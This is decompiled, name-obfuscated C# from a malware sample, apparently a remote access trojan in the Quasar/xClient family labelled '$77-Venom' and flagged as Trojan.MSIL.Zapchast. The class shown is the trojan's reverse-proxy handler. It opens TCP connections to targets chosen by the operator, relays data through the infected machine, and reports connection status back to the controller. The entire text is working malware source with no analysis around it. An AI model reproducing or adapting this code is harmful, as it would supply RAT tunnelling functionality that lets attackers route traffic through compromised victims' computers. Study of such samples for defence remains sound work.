// Decompiled with JetBrains decompiler
// Type: ﳥ쯁뗾逡⿁蹖飊煂⿑눮咶᮫Ļ�벻踻抄퉳
// Assembly: $77-Venom, Version=2.1.0.0, Culture=neutral, PublicKeyToken=null
// MVID: DC8E8704-647D-4CA7-99AB-BB7BE936B486
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.MSIL.Zapchast.gen-815b2bf1ddadfb46a27001e08246e8f82f629eb793963bef856d17e1ef9c4085.exe

using System;
using System.Net;
using System.Net.Sockets;
using xClient.Core.ReverseProxy.Packets;

public class ﳥ쯁뗾逡\u2FC1蹖飊煂\u2FD1눮咶᮫\uEF0EĻ\uFFFD\uF130벻踻抄퉳
{
  public const int 暖\uE7E6\uE0B7쇡\uF397眒\uFFFD炛슴늌悟篮덈䊞\u1737㨯衵\uE902퐈䒴 = 8192;
  private byte[] 笟䃺치唗\uF7C9А\uEF41埪빉\uFFFDꪛ㘅灸\u2B76瑈嵡䫖ꮴ젌儝;
  private bool 냞몔㐀骂\u271B\u27F6갉濇\u19DE\u2D74縆궙怜啙䈿疴参鲶轱\uF14C;

  public int ConnectionId { get; private set; }

  public Socket Handle { get; private set; }

  public string Target { get; private set; }

  public int Port { get; private set; }

  public 鸳\u02E9ܨ蝦\uF41F叕㞘\u24B1承\uF83D\uFFFD愾鋡ꠐ솞㡶Λ묠ᑜ㩨 Client { get; private set; }

  public ﳥ쯁뗾逡\u2FC1蹖飊煂\u2FD1눮咶᮫\uEF0EĻ\uFFFD\uF130벻踻抄퉳(
    ReverseProxyConnect command,
    鸳\u02E9ܨ蝦\uF41F叕㞘\u24B1承\uF83D\uFFFD愾鋡ꠐ솞㡶Λ묠ᑜ㩨 client)
  {
    this.ConnectionId = command.ConnectionId;
    this.Target = command.Target;
    this.Port = command.Port;
    this.Client = client;
    this.Handle = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
    this.Handle.BeginConnect(command.Target, command.Port, new AsyncCallback(this.았로\uEC22勤醉\u1C98舶慎Ԭ㡲\uE2A4챻\u2421Ằ\u27EA\u21B7莄\uFFFD铻ﯣ), (object) null);
  }

  private void 았로\uEC22勤醉\u1C98舶慎Ԭ㡲\uE2A4챻\u2421Ằ\u27EA\u21B7莄\uFFFD铻ﯣ(IAsyncResult ar)
  {
    try
    {
      this.Handle.EndConnect(ar);
    }
    catch
    {
    }
    if (this.Handle.Connected)
    {
      try
      {
        this.笟䃺치唗\uF7C9А\uEF41埪빉\uFFFDꪛ㘅灸\u2B76瑈嵡䫖ꮴ젌儝 = new byte[8192];
        this.Handle.BeginReceive(this.笟䃺치唗\uF7C9А\uEF41埪빉\uFFFDꪛ㘅灸\u2B76瑈嵡䫖ꮴ젌儝, 0, this.笟䃺치唗\uF7C9А\uEF41埪빉\uFFFDꪛ㘅灸\u2B76瑈嵡䫖ꮴ젌儝.Length, SocketFlags.None, new AsyncCallback(this.ﰣ論‭鸮㛜ᷴ\uFFFD뻑䜎佶횦︩슬\uEA5D\uF598역골텠\uE24E웞), (object) null);
      }
      catch
      {
        new ReverseProxyConnectResponse(this.ConnectionId, false, (IPAddress) null, 0, this.Target).Execute(this.Client);
        this.酂鞄ࠎ䭣๑ᖥ竼엇黆뤢蘁嫗㒟ꚏ\u2468鵝溁놼刻\uF495();
      }
      IPEndPoint localEndPoint = (IPEndPoint) this.Handle.LocalEndPoint;
      new ReverseProxyConnectResponse(this.ConnectionId, true, localEndPoint.Address, localEndPoint.Port, this.Target).Execute(this.Client);
    }
    else
      new ReverseProxyConnectResponse(this.ConnectionId, false, (IPAddress) null, 0, this.Target).Execute(this.Client);
  }

  private void ﰣ論‭鸮㛜ᷴ\uFFFD뻑䜎佶횦︩슬\uEA5D\uF598역골텠\uE24E웞(IAsyncResult ar)
  {
    try
    {
      int length = this.Handle.EndReceive(ar);
      if (length <= 0)
      {
        this.酂鞄ࠎ䭣๑ᖥ竼엇黆뤢蘁嫗㒟ꚏ\u2468鵝溁놼刻\uF495();
        return;
      }
      byte[] numArray = new byte[length];
      Array.Copy((Array) this.笟䃺치唗\uF7C9А\uEF41埪빉\uFFFDꪛ㘅灸\u2B76瑈嵡䫖ꮴ젌儝, (Array) numArray, length);
      new ReverseProxyData(this.ConnectionId, numArray).Execute(this.Client);
    }
    catch
    {
      this.酂鞄ࠎ䭣๑ᖥ竼엇黆뤢蘁嫗㒟ꚏ\u2468鵝溁놼刻\uF495();
      return;
    }
    try
    {
      this.Handle.BeginReceive(this.笟䃺치唗\uF7C9А\uEF41埪빉\uFFFDꪛ㘅灸\u2B76瑈嵡䫖ꮴ젌儝, 0, this.笟䃺치唗\uF7C9А\uEF41埪빉\uFFFDꪛ㘅灸\u2B76瑈嵡䫖ꮴ젌儝.Length, SocketFlags.None, new AsyncCallback(this.ﰣ論‭鸮㛜ᷴ\uFFFD뻑䜎佶횦︩슬\uEA5D\uF598역골텠\uE24E웞), (object) null);
    }
    catch
    {
      this.酂鞄ࠎ䭣๑ᖥ竼엇黆뤢蘁嫗㒟ꚏ\u2468鵝溁놼刻\uF495();
    }
  }

  public void 酂鞄ࠎ䭣๑ᖥ竼엇黆뤢蘁嫗㒟ꚏ\u2468鵝溁놼刻\uF495()
  {
    if (!this.냞몔㐀骂\u271B\u27F6갉濇\u19DE\u2D74縆궙怜啙䈿疴参鲶轱\uF14C)
    {
      this.냞몔㐀骂\u271B\u27F6갉濇\u19DE\u2D74縆궙怜啙䈿疴参鲶轱\uF14C = true;
      new ReverseProxyDisconnect(this.ConnectionId).Execute(this.Client);
    }
    try
    {
      this.Handle.Close();
    }
    catch
    {
    }
    this.Client.쨤丶Ɲ쿩\uE935ᕿ椷䗀쯎籁뫛硫쐚鴐ᷔw\uEC44\uECF0吝拗(this.ConnectionId);
  }

  public void 餾\u0B9B뮪㐥ᔠ\uEFB4췞迾늻裴囋连㵮쒵阾뵃傿\u1B65毜ꁨ(byte[] data)
  {
    try
    {
      this.Handle.Send(data);
    }
    catch
    {
      this.酂鞄ࠎ䭣๑ᖥ竼엇黆뤢蘁嫗㒟ꚏ\u2468鵝溁놼刻\uF495();
    }
  }
}
